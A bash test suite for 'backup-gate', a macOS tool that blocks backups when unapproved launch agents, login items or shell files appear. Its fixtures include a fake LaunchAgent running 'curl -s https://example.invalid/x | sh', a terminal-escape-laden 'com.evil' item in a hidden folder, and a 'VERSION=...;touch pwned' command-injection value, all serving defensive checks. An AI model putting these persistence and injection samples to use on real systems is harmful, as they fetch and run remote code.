#!/bin/bash
# Tests for backup-gate's run logic. No root, no Time Machine, no changes to the system:
# the script runs against a temp folder, with stand-ins for ioreg, diskutil, tmutil and id.
#   bash tests/run.sh
# Checks are written as single-quoted strings that check() evaluates later:
# shellcheck disable=SC2016
set -u
GATE=$(cd "$(dirname "$0")/.." && pwd)/backup-gate
T=$(mktemp -d "${TMPDIR:-/tmp}/backup-gate-test.XXXXXX")
trap 'rm -rf "$T"' EXIT
mkdir -p "$T/bin" "$T/etc" "$T/state"

# Test copy: own paths and PATH; inventory, exclusions and notifications replaced by stubs.
sed -e "s#^SELF=.*#SELF=$T/backup-gate#" -e "s#^ETC=.*#ETC=$T/etc#" -e "s#^STATE=.*#STATE=$T/state#" \
    -e "s#^LOG=.*#LOG=$T/log#" -e "s#^LOCK=.*#LOCK=$T/lock#" -e "s#^PLIST=.*#PLIST=$T/plist#" -e "s#^BREW=.*#BREW=$T/brew#" \
    -e "s#^PATH=.*#PATH=$T/bin:/usr/bin:/bin:/usr/sbin:/sbin#" "$GATE" |
awk -v T="$T" '/^case "\$\{1:-\}" in/ {
  print "refresh() { cp \"" T "/inv\" \"$STATE/current\"; : > \"$STATE/flags\"; }"
  print "exclusions() { :; }"
  print "notify() { log \"NOTIFY: $1\"; }"
  print "if [ \"${1:-}\" = __describe ]; then describe \"$2\" \"$3\" \"$4\"; exit; fi" } { print }' > "$T/backup-gate"
sed -e 's/__DEST_ID__/TESTDEST/' -e 's/__DEST_VOLUME__/TESTVOL/' "$(dirname "$GATE")/config.example" > "$T/etc/config"
printf 'launch\t/Library/LaunchDaemons/x\troot:wheel:644\tabc\n' > "$T/inv"
cp "$T/inv" "$T/etc/allowlist"

cat > "$T/bin/id" <<EOF
#!/bin/bash
[ "\${1:-}" = -u ] && [ \$# -eq 1 ] && { echo 0; exit 0; }; exec /usr/bin/id "\$@"
EOF
cat > "$T/bin/ioreg" <<EOF
#!/bin/bash
case \$(cat "$T/lockstate") in
  unlocked) echo '  | "IOConsoleUsers" = ({"kCGSSessionOnConsoleKey"=Yes,"kCGSSessionUserNameKey"="u"})' ;;
  locked)   echo '  | "IOConsoleUsers" = ({"kCGSSessionOnConsoleKey"=Yes,"CGSSessionScreenIsLocked"=Yes,"kCGSSessionUserNameKey"="u"})' ;;
  nouser)   echo '  | "IOConsoleUsers" = ({"kCGSSessionOnConsoleKey"=No,"kCGSSessionUserNameKey"="u"})' ;;
esac
EOF
cat > "$T/bin/diskutil" <<EOF
#!/bin/bash
case "\$1 \${2:-}" in
  "info "*) echo "   Mounted:                   \$(cat "$T/mounted")" ;;
  "mount "*) exit 1 ;;
  "apfs listSnapshots") while read -r s; do echo "|   Name:        com.apple.TimeMachine.\$s.backup"; done < "$T/snaps" ;;
esac
EOF
cat > "$T/bin/tmutil" <<EOF
#!/bin/bash
case "\$1" in
  status) echo "    Running = \$(cat "$T/tmrunning");" ;;
  startbackup) echo "Total copied: 500 MB"; n=\$(wc -l < "$T/snaps")
               [ "\$(cat "$T/tmmode")" = ok ] && printf '2026-01-01-%06d\n' "\$n" >> "$T/snaps"; exit 0 ;;
esac
EOF
chmod +x "$T"/bin/* "$T/backup-gate"

pass=0 fail=0
reset() {  # $1 = hours since last success
  : > "$T/log"; rm -rf "$T/lock"
  echo $(( $(date +%s) - $1 * 3600 )) > "$T/state/last-success"
  echo unlocked > "$T/lockstate"; echo ok > "$T/tmmode"; echo Yes > "$T/mounted"; echo 0 > "$T/tmrunning"
  echo 2026-01-01-000000 > "$T/snaps"; cp "$T/etc/allowlist" "$T/inv"
}
# rc is read by the checks, through eval
# shellcheck disable=SC2034
gate() { "$T/backup-gate" run "$@" > /dev/null 2>&1; rc=$?; }
age() { echo $(( $(date +%s) - $(cat "$T/state/last-success") )); }
check() {  # name, condition...
  local name=$1; shift
  if "$@"; then pass=$((pass + 1)); echo "ok   $name"
  else fail=$((fail + 1)); echo "FAIL $name"; sed 's/^/       log: /' "$T/log"; [ -s "${F:-/nonexistent}/out" ] && sed 's/^/       out: /' "$F/out"; fi
}
logged() { grep -q -- "$1" "$T/log"; }
snaps() { [ "$(wc -l < "$T/snaps" | tr -d ' ')" = "$1" ]; }

reset 1; gate
check "not due: silent no-op"                  eval '[ $rc = 0 ] && [ ! -s "$T/log" ] && snaps 1'

reset 5; echo locked > "$T/lockstate"; gate; gate; gate
check "due + locked: skipped, logged once"     eval '[ "$(grep -c "skipped: screen locked" "$T/log")" = 1 ] && snaps 1'

reset 5; echo nouser > "$T/lockstate"; gate
check "due + nobody logged in: skipped"        eval 'logged "skipped: screen locked" && snaps 1'

reset 5; echo fail > "$T/tmmode"; gate
check "tmutil exits 0 but no snapshot: failed" eval 'logged "no new completed backup" && logged "backup failed" && [ "$(age)" -ge 17999 ]'

reset 5; gate
check "due + unlocked: backup recorded"        eval 'logged "backup finished (2026-01-01-000001)" && [ "$(age)" -lt 5 ]'

reset 1; gate now
check "'run now' ignores MIN_HOURS"            eval 'logged "backup finished" && snaps 2'

reset 5; printf 'launch\t/Library/LaunchAgents/new\troot:wheel:644\tdef\n' >> "$T/inv"; gate
check "unapproved change: blocked, notified"   eval '[ $rc = 3 ] && logged "BLOCKED: 1 change" && logged "NOTIFY:" && snaps 1'

reset 5; echo No > "$T/mounted"; gate
check "destination not mounted: skipped"       eval 'logged "not mounted" && snaps 1'

reset 5; echo 1 > "$T/tmrunning"; gate
check "Time Machine already running: skipped"  eval 'logged "already running" && snaps 1'

reset 5; mkdir "$T/lock"; gate
check "another run in progress: skipped"       eval 'logged "another run is in progress" && [ -d "$T/lock" ]'

reset 5; gate
check "lock released after a run"              eval '[ ! -e "$T/lock" ]'

# ---- readable change list (approve / status) ----
echo
F=$T/fx; mkdir -p "$F/Library/LaunchAgents" "$F/.hidden"
plutil -create xml1 "$F/Library/LaunchAgents/com.update.helper.plist"
plutil -insert Label -string com.update.helper "$F/Library/LaunchAgents/com.update.helper.plist"
plutil -insert ProgramArguments -json '["/bin/bash","-c","curl -s https://example.invalid/x | sh"]' "$F/Library/LaunchAgents/com.update.helper.plist"
printf '#!/bin/sh\nexit 0\n' > "$F/.hidden/updater"; chmod +x "$F/.hidden/updater"
TAB=$'\t' ESC=$'\033'
old=$F/old new=$F/new
desc() { "$T/backup-gate" __describe "$old" "$new" "$1" > "$F/out" 2>&1; }
has() { grep -qF -- "$1" "$F/out"; }

: > "$old"
printf 'launch%s%s/Library/LaunchAgents/com.update.helper.plist%syou:staff:644%sabc\n' "$TAB" "$F" "$TAB" "$TAB" > "$new"
desc full
check "added agent: created date, command, built-in tool, no Apple claim" eval 'has "+ ADDED   Launch agent (user fx)" && has "runs     /bin/bash -c '"'"'curl -s https://example.invalid/x | sh'"'"'" && has "a tool built into macOS: judge this item by the command above" && has "created 20" && ! has "signed by Apple" && has "! starts bash"'

printf 'btm%s501%sapp (0x2)|2.com.evil%s[2Jx|%s/.hidden/updater|%s/.hidden/updater\n' "$TAB" "$TAB" "$ESC" "$F" "$F" > "$new"
desc full
check "unsigned program in hidden folder: warnings" eval 'has "NOT SIGNED" && has "! no identified developer" && has "! runs from a temporary, shared or hidden folder"'
check "terminal escape codes are stripped"         eval '! grep -q "$ESC" "$F/out" && has "com.evil[2Jx"'

printf 'btm%s501%sapp (0x2)|2.com.good|/Applications/Good.app|\n' "$TAB" "$TAB" > "$old"
{ printf 'btm%s501%sapp (0x2)|2.com.good|/Applications/AAA.app|\n' "$TAB" "$TAB"; cat "$old"; } > "$new"
desc brief
check "duplicate of an approved id shows up"       eval '[ "$(grep -c "ADDED\|CHANGED" "$F/out")" = 1 ]'

printf 'launch%s/Library/LaunchDaemons/a.plist%sroot:wheel:644%sabc\nshell%s/Users/u/.zshrc%sABSENT\nsystem%s%s%sold\n' \
  "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" /usr/local/sbin/backup-gate "$TAB" > "$old"
printf 'launch%s/Library/LaunchDaemons/a.plist%su:staff:666%sdef\nshell%s/Users/u/.zshrc%sfff\nsystem%s%s%snew\n' \
  "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" /usr/local/sbin/backup-gate "$TAB" > "$new"
sed -i '' "s#/usr/local/sbin/backup-gate#$T/backup-gate#" "$old" "$new"
desc full
check "changed: permissions, contents, created"    eval 'has "permissions root wheel 644 -> u staff 666" && has "change   contents changed" && has "change   created"'
check "gate's own files are labeled"               eval 'has "backup-gate itself"'
check "three changes, launch daemons listed first" eval '[ "$(grep -c "^~ CHANGED" "$F/out")" = 3 ] && head -n 1 "$F/out" | grep -q "Launch daemon"'

old=/dev/null; printf 'shell%s/Users/u/.zshrc%sABSENT\nhook%s/x:LoginHook%snone\nlaunch%s/Library/LaunchDaemons/a.plist%sroot:wheel:644%sabc\n' \
  "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" > "$new"
desc compact
check "first approval hides watched-but-absent files" eval '[ "$(grep -c "^  \* " "$F/out")" = 1 ] && has "they don'"'"'t exist yet: 2"'

# ---- update downloaded by Homebrew but not installed (status) ----
echo
mkdir -p "$T/brew"; cp "$T/etc/allowlist" "$T/state/current"
st() { "$T/backup-gate" status > "$F/out" 2>&1; }
sed 's/^VERSION=.*/VERSION=99.0.0/' "$GATE" > "$T/brew/backup-gate"; st
check "newer Homebrew copy: status says so"        eval 'has "Update downloaded but not installed: 99.0.0" && has "sudo $T/brew/install.sh"'
sed 's/^VERSION=.*/VERSION=0.0.1/' "$GATE" > "$T/brew/backup-gate"; st
check "older Homebrew copy: nothing said"          eval '! has "Update downloaded"'
printf 'VERSION=99.0.0;touch %s/pwned\n' "$T" > "$T/brew/backup-gate"; st
check "malformed version: ignored, nothing run"    eval '! has "Update downloaded" && [ ! -e "$T/pwned" ]'
rm -rf "$T/brew"; st
check "no Homebrew copy: nothing said"             eval '! has "Update downloaded"'

echo; echo "$pass passed, $fail failed"
[ "$fail" = 0 ]
